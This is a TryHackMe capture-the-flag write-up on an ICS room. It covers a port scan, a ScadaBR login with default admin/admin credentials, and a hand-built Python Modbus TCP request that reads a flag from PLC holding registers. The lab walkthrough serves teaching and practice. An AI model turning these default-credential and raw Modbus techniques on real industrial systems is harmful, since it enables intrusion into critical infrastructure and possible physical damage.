## Brr

**Platform:** TryHackMe  
**Date:** 2026-08-21  
**Difficulty:** Easy 🟢  
**Category:** OT / ICS / SCADA  
**Room URL:** [https://tryhackme.com/room/modbushid](https://tryhackme.com/room/modbushid)  
**Status:** ✅ Completed

---

### 📌 What Was This Room About?

> This room was about hacking into an OT (Operational Technology) environment. The goal was to find a SCADA panel, pivot to a PLC communicating over Modbus TCP, and read the flag straight out of the device's holding registers.

---

### 🔍 Reconnaissance

#### Nmap Scan

bash

```bash
# nmap -Pn -p- --min-rate 1500 -T4 --open <MACHINE_IP>
```

**Results:**

|Port|Service|Notes|
|---|---|---|
|22|SSH|Standard remote login|
|80|HTTP|noVNC web front-end — throws an error, nothing useful here|
|5020|Modbus TCP|PLC endpoint — this is where the flag is hiding|
|5901|VNC|Graphical HMI interface|
|8080|HTTP|ScadaBR panel running on Tomcat — this is the one we want|

Port 5020 is a classic alternate Modbus TCP port in OT/ICS challenges. The moment I saw it I knew that's where things were going to get interesting.

---

### 🧭 Steps I Took

#### Step 1 — Getting Into the ScadaBR Panel

- **What I did:** Opened `http://<MACHINE_IP>:8080/ScadaBR/login.htm` in the browser and tried the most obvious thing first, default credentials.
- **Command/Tool used:** Browser
- **What I found:** `admin` / `admin` worked immediately. Walked straight into the admin panel. 😂 Not even a challenge.
- **Why it matters:** ScadaBR is a web-based SCADA/HMI tool that's notorious for being deployed with default credentials left unchanged. 
#### Step 2 — Finding the Data Source

- **What I did:** Once inside the admin panel I navigated to the Data Sources section to see what the panel was talking to.
- **Command/Tool used:** ScadaBR Admin Panel → Data Sources
- **What I found:** One configured data source — a Modbus connection pointing to `plc:5020`.
- **Why it matters:** ScadaBR was just the front-end. The actual flag was sitting inside the PLC itself, communicating over Modbus TCP on port 5020. Time to go talk to it directly 🏭

#### Step 3 — Reading the Flag Straight Out of the PLC

- **What I did:** `pymodbus` wasn't available on the machine so I built a raw Modbus TCP request by hand using Python's socket and struct libraries. Modbus TCP is simple enough to do this — you just need an MBAP header and a Read Holding Registers request (function code `0x03`).
- **Command/Tool used:**

python

```python
import socket, struct

# PDU: function code 0x03 (read holding registers), start=0, count=60
pdu = struct.pack(">BHH", 0x03, 0, 60)

# MBAP header: transaction id, protocol id, length, unit id
mbap = struct.pack(">HHHB", 1, 0, len(pdu) + 1, 1)

s = socket.socket()
s.connect(("<MACHINE_IP>", 5020))
s.sendall(mbap + pdu)
resp = s.recv(4096)

# skip MBAP header (7 bytes) + function code (1 byte) + byte-count (1 byte)
byte_count = resp[8]
regs = struct.unpack(">" + "H" * (byte_count // 2), resp[9:9 + byte_count])

# each register stores one ASCII character
print("".join(chr(r) for r in regs if 32 <= r < 127))
```

- **What I found:** Each 16-bit holding register stored one ASCII character — `0x0054` = T, `0x0048` = H, `0x004d` = M, `0x007b` = `{` — and so on until the full flag decoded out. 🎉
- **Why it matters:** Modbus has zero authentication and zero encryption. Anyone who can reach that port can read or write to the device's registers freely. In an actual industrial environment that means an attacker could read sensor data, overwrite control values, or cause physical damage. 
---

### 🛠 Commands Used

|Command|What It Does|
|---|---|
|`nmap -Pn -p- --min-rate 1500 -T4 --open <IP>`|Full TCP port scan across all ports at high speed|
|ScadaBR login (`admin`/`admin`)|Logs into the SCADA panel using default credentials|
|`socket.connect(<IP>, 5020)`|Opens raw TCP connection to the Modbus PLC endpoint|
|`struct.pack(">BHH", 0x03, 0, 60)`|Builds a Read Holding Registers PDU (function code 0x03)|
|`struct.unpack(">" + "H" * n, data)`|Decodes the register values from the response bytes|
|`chr(r) for r in regs`|Converts each register value to its ASCII character|

---

### 🚩 Flags Found

| Flag                       | Value             |
| -------------------------- | ----------------- |
| PLC Holding Registers Flag | `THM{modbus_hid}` |

---

### 📎 Resources Used

- ScadaBR Documentation
- Modbus Application Protocol Specification